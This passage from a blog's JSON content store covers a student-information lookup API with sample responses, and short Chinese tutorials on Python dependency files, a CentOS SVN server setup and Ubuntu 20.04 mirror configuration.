class=\"string\">\"物联网1601\"</span>\t\t\t\t\t<span class=\"comment\">//班级</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">\"code\"</span>:<span class=\"number\">200</span>,</span><br><span class=\"line\">    <span class=\"string\">\"msg\"</span>:<span class=\"string\">\"操作成功\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>失败</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"data\"</span>:<span class=\"literal\">null</span>,</span><br><span class=\"line\">    <span class=\"string\">\"code\"</span>:<span class=\"number\">500</span>,</span><br><span class=\"line\">    <span class=\"string\">\"msg\"</span>:<span class=\"string\">\"秘钥错误\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"专用接口\"><a href=\"#专用接口\" class=\"headerlink\" title=\"专用接口\"></a>专用接口</h3><p>专用接口仅面向学校可信组织开放，开发者可以凭借学号、姓名、专业、班级这四个信息之一获取与之相关信息。</p>\n<p>1.专用接口调用链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url?token=专用秘钥&amp;keytype=索引类型&amp;keyword=索引数据</span><br></pre></td></tr></table></figure>\n<p>其中url与专用秘钥请联系admin@ctftools.com申请资格，索引类型分为四类，分别是bj(班级)、zy(专业)、uid(学号)、unme(姓名)，索引数据为索引类型对应的数据，例如以下示例：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url?token=xxxx&amp;keytype=bj&amp;keyword=物联网1601</span><br><span class=\"line\"></span><br><span class=\"line\">url?token=xxxx&amp;keytype=uid&amp;keyword=16853046</span><br></pre></td></tr></table></figure></p>\n<p>2.返回数据样式：</p>\n<ul>\n<li>单个</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"data\"</span>:[</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>:<span class=\"number\">1</span>,\t\t\t\t\t\t<span class=\"comment\">//用户在本平台的唯一身份码</span></span><br><span class=\"line\">            <span class=\"string\">\"uid\"</span>:<span class=\"number\">16853046</span>,\t\t\t\t\t<span class=\"comment\">//用户学号</span></span><br><span class=\"line\">            <span class=\"string\">\"uname\"</span>:<span class=\"string\">\"王启航\"</span>,\t\t\t\t\t<span class=\"comment\">//用户姓名</span></span><br><span class=\"line\">            <span class=\"string\">\"grade\"</span>:<span class=\"string\">\"16\"</span>,\t\t\t\t\t<span class=\"comment\">//用户年级</span></span><br><span class=\"line\">            <span class=\"string\">\"college\"</span>:<span class=\"string\">\"计算机与信息技术学院\"</span>,\t\t\t<span class=\"comment\">//用户所在学院</span></span><br><span class=\"line\">            <span class=\"string\">\"speciality\"</span>:<span class=\"string\">\"物联网\"</span>,\t\t\t\t<span class=\"comment\">//用户所在专业</span></span><br><span class=\"line\">            <span class=\"string\">\"clazz\"</span>:<span class=\"string\">\"物联网1601\"</span>\t\t\t\t\t<span class=\"comment\">//班级</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">\"code\"</span>:<span class=\"number\">200</span>,</span><br><span class=\"line\">    <span class=\"string\">\"msg\"</span>:<span class=\"string\">\"操作成功\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>多个</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"data\"</span>:[</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>:<span class=\"number\">1</span>,\t\t\t\t\t\t<span class=\"comment\">//用户在本平台的唯一身份码</span></span><br><span class=\"line\">            <span class=\"string\">\"uid\"</span>:<span class=\"number\">16853046</span>,\t\t\t\t\t<span class=\"comment\">//用户学号</span></span><br><span class=\"line\">            <span class=\"string\">\"uname\"</span>:<span class=\"string\">\"王启航\"</span>,\t\t\t\t\t<span class=\"comment\">//用户姓名</span></span><br><span class=\"line\">            <span class=\"string\">\"grade\"</span>:<span class=\"string\">\"16\"</span>,\t\t\t\t\t<span class=\"comment\">//用户年级</span></span><br><span class=\"line\">            <span class=\"string\">\"college\"</span>:<span class=\"string\">\"计算机与信息技术学院\"</span>,\t\t\t<span class=\"comment\">//用户所在学院</span></span><br><span class=\"line\">            <span class=\"string\">\"speciality\"</span>:<span class=\"string\">\"物联网\"</span>,\t\t\t\t<span class=\"comment\">//用户所在专业</span></span><br><span class=\"line\">            <span class=\"string\">\"clazz\"</span>:<span class=\"string\">\"物联网1601\"</span>\t\t\t\t\t<span class=\"comment\">//班级</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>:<span class=\"number\">1</span>,\t\t\t\t\t\t<span class=\"comment\">//用户在本平台的唯一身份码</span></span><br><span class=\"line\">            <span class=\"string\">\"uid\"</span>:<span class=\"number\">16853046</span>,\t\t\t\t\t<span class=\"comment\">//用户学号</span></span><br><span class=\"line\">            <span class=\"string\">\"uname\"</span>:<span class=\"string\">\"王启航\"</span>,\t\t\t\t\t<span class=\"comment\">//用户姓名</span></span><br><span class=\"line\">            <span class=\"string\">\"grade\"</span>:<span class=\"string\">\"16\"</span>,\t\t\t\t\t<span class=\"comment\">//用户年级</span></span><br><span class=\"line\">            <span class=\"string\">\"college\"</span>:<span class=\"string\">\"计算机与信息技术学院\"</span>,\t\t\t<span class=\"comment\">//用户所在学院</span></span><br><span class=\"line\">            <span class=\"string\">\"speciality\"</span>:<span class=\"string\">\"物联网\"</span>,\t\t\t\t<span class=\"comment\">//用户所在专业</span></span><br><span class=\"line\">            <span class=\"string\">\"clazz\"</span>:<span class=\"string\">\"物联网1601\"</span>\t\t\t\t\t<span class=\"comment\">//班级</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">\"code\"</span>:<span class=\"number\">200</span>,</span><br><span class=\"line\">    <span class=\"string\">\"msg\"</span>:<span class=\"string\">\"操作成功\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>问题与建议都可以联系：admin@ctftools.com</p>"},{"title":"Python自动处理依赖","date":"2019-11-14T12:45:54.000Z","_content":"\n### 一、起由\n\npython项目常常引入众多包，当更换环境时一个个导入太麻烦，而且有导入错版本导致不兼容的可能，本文提供了一种非常常用的方法自动处理python依赖。\n<!--more-->\n\n### 二、生成依赖（以下操作需要先cmd到项目根目录）\n\n#### 1.生成当前python环境所有依赖\n\n一条命令即可：\n```bash\npip freeze > requirements.txt\n```\n#### 2.只生成当前项目所所需依赖\n\n```bash\npip install pipreqs\npipreqs ./\n```\n如果报编码错误那么强制使用utf-8\n```bash\npipreqs ./ --encoding=utf-8\n```\n\n### 三、安装依赖\n\n一条命令即可：\n```bash\npip install -r requirements.txt\n```\n","source":"_posts/post243.md","raw":"---\ntitle: Python自动处理依赖\ndate: 2019-11-14 20:45:54\ntags: 编程\n---\n\n### 一、起由\n\npython项目常常引入众多包，当更换环境时一个个导入太麻烦，而且有导入错版本导致不兼容的可能，本文提供了一种非常常用的方法自动处理python依赖。\n<!--more-->\n\n### 二、生成依赖（以下操作需要先cmd到项目根目录）\n\n#### 1.生成当前python环境所有依赖\n\n一条命令即可：\n```bash\npip freeze > requirements.txt\n```\n#### 2.只生成当前项目所所需依赖\n\n```bash\npip install pipreqs\npipreqs ./\n```\n如果报编码错误那么强制使用utf-8\n```bash\npipreqs ./ --encoding=utf-8\n```\n\n### 三、安装依赖\n\n一条命令即可：\n```bash\npip install -r requirements.txt\n```\n","slug":"post243","published":1,"updated":"2020-11-16T09:05:37.165Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdv002lq0sz1pi0pfog","content":"<h3 id=\"一、起由\"><a href=\"#一、起由\" class=\"headerlink\" title=\"一、起由\"></a>一、起由</h3><p>python项目常常引入众多包，当更换环境时一个个导入太麻烦，而且有导入错版本导致不兼容的可能，本文提供了一种非常常用的方法自动处理python依赖。<br><a id=\"more\"></a></p>\n<h3 id=\"二、生成依赖（以下操作需要先cmd到项目根目录）\"><a href=\"#二、生成依赖（以下操作需要先cmd到项目根目录）\" class=\"headerlink\" title=\"二、生成依赖（以下操作需要先cmd到项目根目录）\"></a>二、生成依赖（以下操作需要先cmd到项目根目录）</h3><h4 id=\"1-生成当前python环境所有依赖\"><a href=\"#1-生成当前python环境所有依赖\" class=\"headerlink\" title=\"1.生成当前python环境所有依赖\"></a>1.生成当前python环境所有依赖</h4><p>一条命令即可：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2-只生成当前项目所所需依赖\"><a href=\"#2-只生成当前项目所所需依赖\" class=\"headerlink\" title=\"2.只生成当前项目所所需依赖\"></a>2.只生成当前项目所所需依赖</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install pipreqs</span><br><span class=\"line\">pipreqs ./</span><br></pre></td></tr></table></figure>\n<p>如果报编码错误那么强制使用utf-8<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pipreqs ./ --encoding=utf-8</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"三、安装依赖\"><a href=\"#三、安装依赖\" class=\"headerlink\" title=\"三、安装依赖\"></a>三、安装依赖</h3><p>一条命令即可：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"一、起由\"><a href=\"#一、起由\" class=\"headerlink\" title=\"一、起由\"></a>一、起由</h3><p>python项目常常引入众多包，当更换环境时一个个导入太麻烦，而且有导入错版本导致不兼容的可能，本文提供了一种非常常用的方法自动处理python依赖。<br>","more":"</p>\n<h3 id=\"二、生成依赖（以下操作需要先cmd到项目根目录）\"><a href=\"#二、生成依赖（以下操作需要先cmd到项目根目录）\" class=\"headerlink\" title=\"二、生成依赖（以下操作需要先cmd到项目根目录）\"></a>二、生成依赖（以下操作需要先cmd到项目根目录）</h3><h4 id=\"1-生成当前python环境所有依赖\"><a href=\"#1-生成当前python环境所有依赖\" class=\"headerlink\" title=\"1.生成当前python环境所有依赖\"></a>1.生成当前python环境所有依赖</h4><p>一条命令即可：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip freeze &gt; requirements.txt</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"2-只生成当前项目所所需依赖\"><a href=\"#2-只生成当前项目所所需依赖\" class=\"headerlink\" title=\"2.只生成当前项目所所需依赖\"></a>2.只生成当前项目所所需依赖</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install pipreqs</span><br><span class=\"line\">pipreqs ./</span><br></pre></td></tr></table></figure>\n<p>如果报编码错误那么强制使用utf-8<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pipreqs ./ --encoding=utf-8</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"三、安装依赖\"><a href=\"#三、安装依赖\" class=\"headerlink\" title=\"三、安装依赖\"></a>三、安装依赖</h3><p>一条命令即可：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></p>"},{"title":"centos安装svn服务器","date":"2020-11-03T09:11:47.000Z","toc":true,"_content":"\n## 一、安装svn\n\n```sh\nyum install subversion\n```\n<!--more-->\n## 二、建立版本库\n\n```sh\ncd /home/svn\nmkdir project\nsvnadmin create /home/svn/project\n```\n\n## 三、控制权限、目录，启动\n\n```sh\ncd /home/svn/project/conf\n```\n\nauthz 是权限控制文件 passwd 是帐号密码文件 svnserve.conf 是SVN服务配置文件\n\n### 1.authz文件如下，`username`改为你的用户名\n\n```\n[/]\nusername = rw\n```\n\n可以添加多条，如\n\n```\n[/project1]\nusername1 = rw\n```\n\n### 2.passwd文件如下，`username`改为你的用户名，password改为密码，不用引号\n\n\n```\n[users]\nusername = password\nusername1 = password1\n```\n\n### 3.svnserve.conf文件如下\n\n```\n[general]\nanon-access = none\nauth-access = write\npassword-db = passwd\nauthz-db = authz\n```\n\n### 4.启动svn\n\n```sh\nsvnserve -d -r /home/svn/project/\n```\n\n## 四、连接到SVN\n\n安装诸如`svn小乌龟`之类的工具，连接到你的服务器ip加上`authz`文件中中括号内的路径，例如`svn://192.168.1.2/project1`，账号为`authz`文件中配置的账号`username1`，密码为`passwd`文件中配置的`password1`\n\n## 五、重启SVN\n\n```sh\nkillall svnserve\nsvnserve -d -r /home/svn/project/\n```","source":"_posts/post246.md","raw":"---\ntitle: centos安装svn服务器\ndate: 2020-11-03 17:11:47\ntags: 运维\ntoc: true\n---\n\n## 一、安装svn\n\n```sh\nyum install subversion\n```\n<!--more-->\n## 二、建立版本库\n\n```sh\ncd /home/svn\nmkdir project\nsvnadmin create /home/svn/project\n```\n\n## 三、控制权限、目录，启动\n\n```sh\ncd /home/svn/project/conf\n```\n\nauthz 是权限控制文件 passwd 是帐号密码文件 svnserve.conf 是SVN服务配置文件\n\n### 1.authz文件如下，`username`改为你的用户名\n\n```\n[/]\nusername = rw\n```\n\n可以添加多条，如\n\n```\n[/project1]\nusername1 = rw\n```\n\n### 2.passwd文件如下，`username`改为你的用户名，password改为密码，不用引号\n\n\n```\n[users]\nusername = password\nusername1 = password1\n```\n\n### 3.svnserve.conf文件如下\n\n```\n[general]\nanon-access = none\nauth-access = write\npassword-db = passwd\nauthz-db = authz\n```\n\n### 4.启动svn\n\n```sh\nsvnserve -d -r /home/svn/project/\n```\n\n## 四、连接到SVN\n\n安装诸如`svn小乌龟`之类的工具，连接到你的服务器ip加上`authz`文件中中括号内的路径，例如`svn://192.168.1.2/project1`，账号为`authz`文件中配置的账号`username1`，密码为`passwd`文件中配置的`password1`\n\n## 五、重启SVN\n\n```sh\nkillall svnserve\nsvnserve -d -r /home/svn/project/\n```","slug":"post246","published":1,"updated":"2020-11-12T05:52:59.805Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdw002oq0sz3euybwdm","content":"<h2 id=\"一、安装svn\"><a href=\"#一、安装svn\" class=\"headerlink\" title=\"一、安装svn\"></a>一、安装svn</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install subversion</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"二、建立版本库\"><a href=\"#二、建立版本库\" class=\"headerlink\" title=\"二、建立版本库\"></a>二、建立版本库</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /home/svn</span><br><span class=\"line\">mkdir project</span><br><span class=\"line\">svnadmin create /home/svn/project</span><br></pre></td></tr></table></figure>\n<h2 id=\"三、控制权限、目录，启动\"><a href=\"#三、控制权限、目录，启动\" class=\"headerlink\" title=\"三、控制权限、目录，启动\"></a>三、控制权限、目录，启动</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /home/svn/project/conf</span><br></pre></td></tr></table></figure>\n<p>authz 是权限控制文件 passwd 是帐号密码文件 svnserve.conf 是SVN服务配置文件</p>\n<h3 id=\"1-authz文件如下，username改为你的用户名\"><a href=\"#1-authz文件如下，username改为你的用户名\" class=\"headerlink\" title=\"1.authz文件如下，username改为你的用户名\"></a>1.authz文件如下，<code>username</code>改为你的用户名</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[/]</span><br><span class=\"line\">username = rw</span><br></pre></td></tr></table></figure>\n<p>可以添加多条，如</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[/project1]</span><br><span class=\"line\">username1 = rw</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-passwd文件如下，username改为你的用户名，password改为密码，不用引号\"><a href=\"#2-passwd文件如下，username改为你的用户名，password改为密码，不用引号\" class=\"headerlink\" title=\"2.passwd文件如下，username改为你的用户名，password改为密码，不用引号\"></a>2.passwd文件如下，<code>username</code>改为你的用户名，password改为密码，不用引号</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[users]</span><br><span class=\"line\">username = password</span><br><span class=\"line\">username1 = password1</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-svnserve-conf文件如下\"><a href=\"#3-svnserve-conf文件如下\" class=\"headerlink\" title=\"3.svnserve.conf文件如下\"></a>3.svnserve.conf文件如下</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[general]</span><br><span class=\"line\">anon-access = none</span><br><span class=\"line\">auth-access = write</span><br><span class=\"line\">password-db = passwd</span><br><span class=\"line\">authz-db = authz</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-启动svn\"><a href=\"#4-启动svn\" class=\"headerlink\" title=\"4.启动svn\"></a>4.启动svn</h3><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svnserve -d -r /home/svn/project/</span><br></pre></td></tr></table></figure>\n<h2 id=\"四、连接到SVN\"><a href=\"#四、连接到SVN\" class=\"headerlink\" title=\"四、连接到SVN\"></a>四、连接到SVN</h2><p>安装诸如<code>svn小乌龟</code>之类的工具，连接到你的服务器ip加上<code>authz</code>文件中中括号内的路径，例如<code>svn://192.168.1.2/project1</code>，账号为<code>authz</code>文件中配置的账号<code>username1</code>，密码为<code>passwd</code>文件中配置的<code>password1</code></p>\n<h2 id=\"五、重启SVN\"><a href=\"#五、重启SVN\" class=\"headerlink\" title=\"五、重启SVN\"></a>五、重启SVN</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">killall svnserve</span><br><span class=\"line\">svnserve -d -r /home/svn/project/</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<h2 id=\"一、安装svn\"><a href=\"#一、安装svn\" class=\"headerlink\" title=\"一、安装svn\"></a>一、安装svn</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install subversion</span><br></pre></td></tr></table></figure>","more":"<h2 id=\"二、建立版本库\"><a href=\"#二、建立版本库\" class=\"headerlink\" title=\"二、建立版本库\"></a>二、建立版本库</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /home/svn</span><br><span class=\"line\">mkdir project</span><br><span class=\"line\">svnadmin create /home/svn/project</span><br></pre></td></tr></table></figure>\n<h2 id=\"三、控制权限、目录，启动\"><a href=\"#三、控制权限、目录，启动\" class=\"headerlink\" title=\"三、控制权限、目录，启动\"></a>三、控制权限、目录，启动</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /home/svn/project/conf</span><br></pre></td></tr></table></figure>\n<p>authz 是权限控制文件 passwd 是帐号密码文件 svnserve.conf 是SVN服务配置文件</p>\n<h3 id=\"1-authz文件如下，username改为你的用户名\"><a href=\"#1-authz文件如下，username改为你的用户名\" class=\"headerlink\" title=\"1.authz文件如下，username改为你的用户名\"></a>1.authz文件如下，<code>username</code>改为你的用户名</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[/]</span><br><span class=\"line\">username = rw</span><br></pre></td></tr></table></figure>\n<p>可以添加多条，如</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[/project1]</span><br><span class=\"line\">username1 = rw</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-passwd文件如下，username改为你的用户名，password改为密码，不用引号\"><a href=\"#2-passwd文件如下，username改为你的用户名，password改为密码，不用引号\" class=\"headerlink\" title=\"2.passwd文件如下，username改为你的用户名，password改为密码，不用引号\"></a>2.passwd文件如下，<code>username</code>改为你的用户名，password改为密码，不用引号</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[users]</span><br><span class=\"line\">username = password</span><br><span class=\"line\">username1 = password1</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-svnserve-conf文件如下\"><a href=\"#3-svnserve-conf文件如下\" class=\"headerlink\" title=\"3.svnserve.conf文件如下\"></a>3.svnserve.conf文件如下</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[general]</span><br><span class=\"line\">anon-access = none</span><br><span class=\"line\">auth-access = write</span><br><span class=\"line\">password-db = passwd</span><br><span class=\"line\">authz-db = authz</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-启动svn\"><a href=\"#4-启动svn\" class=\"headerlink\" title=\"4.启动svn\"></a>4.启动svn</h3><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svnserve -d -r /home/svn/project/</span><br></pre></td></tr></table></figure>\n<h2 id=\"四、连接到SVN\"><a href=\"#四、连接到SVN\" class=\"headerlink\" title=\"四、连接到SVN\"></a>四、连接到SVN</h2><p>安装诸如<code>svn小乌龟</code>之类的工具，连接到你的服务器ip加上<code>authz</code>文件中中括号内的路径，例如<code>svn://192.168.1.2/project1</code>，账号为<code>authz</code>文件中配置的账号<code>username1</code>，密码为<code>passwd</code>文件中配置的<code>password1</code></p>\n<h2 id=\"五、重启SVN\"><a href=\"#五、重启SVN\" class=\"headerlink\" title=\"五、重启SVN\"></a>五、重启SVN</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">killall svnserve</span><br><span class=\"line\">svnserve -d -r /home/svn/project/</span><br></pre></td></tr></table></figure>"},{"title":"Ubuntu 20.04 换国内源","date":"2020-11-02T06:57:54.000Z","_content":"\n编辑 `/etc/apt/sources.list`\n\n<!--more-->\n\n```\nsudo vim /etc/apt/sources.list\n```\n\n### 清华源  \n\n```\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\n\n# 预发布软件源，不建议启用\n# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\n```\n\n### 最后\n\n```\nsudo apt update\nsudo apt upgrade\n```\n\n### 其他源  \n\n+ 阿里  \n\n```\ndeb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse\n```\n\n+ 中科大\n\n```\ndeb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse\ndeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse\ndeb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\ndeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\ndeb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\ndeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\ndeb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse\ndeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse\ndeb https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\ndeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\n```\n\n+ 网易163\n\n```\ndeb http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse\ndeb http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse\ndeb http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse\ndeb http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse\ndeb http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse\ndeb-src http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse\ndeb-src http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse\ndeb-src http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse\ndeb-src 